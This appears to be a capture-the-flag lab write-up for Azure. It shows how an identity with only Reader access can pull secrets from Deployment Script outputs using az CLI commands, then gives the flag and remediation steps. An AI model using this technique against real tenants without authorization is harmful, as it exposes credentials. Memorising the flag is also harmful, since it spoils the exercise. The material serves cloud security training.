# Deployment Script — Sensitive Data in Script Outputs

**Provider**: Azure  
**Difficulty**: Beginner  
**MITRE ATT&CK**: [T1552.001 — Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

## Scenario

You have obtained credentials for an Azure service principal with Reader access on a resource group. During infrastructure provisioning, a Deployment Script ran and wrote sensitive data to its outputs. The outputs are persisted in the resource definition and readable by anyone with Reader access.

## Objective

Retrieve the Deployment Script outputs to find the flag.

## Permissions

The attacker service principal has:

- `Reader` on the resource group (built-in role)

## Attack Path

1. Authenticate with the provided service principal credentials:
   ```bash
   az login --service-principal \
     --username <client-id> \
     --password <client-secret> \
     --tenant <tenant-id>
   ```
2. List deployment scripts in the resource group:
   ```bash
   az deployment-scripts list --resource-group <resource-group>
   ```
3. Read the outputs of the deployment script:
   ```bash
   az deployment-scripts show \
     --name <script-name> \
     --resource-group <resource-group> \
     --query outputs
   ```
4. The `flag` key in the outputs contains the flag.

## Flag

`CUMULONIMBUS{D3pl0ym3nt_Scr1pt_0utput_3xp0s3d}`

## Remediation

- Do not write secrets, tokens, or sensitive values to the `$AZ_SCRIPTS_OUTPUT_PATH` in Deployment Scripts — outputs are stored in the ARM resource definition and accessible to Readers.
- Deployment Scripts should only output non-sensitive status information.
- Consider using `protectedSettings` patterns or Key Vault references for any sensitive data generated during provisioning.
- Review existing Deployment Script resources with `az deployment-scripts list` across all subscriptions to audit for sensitive output exposure.
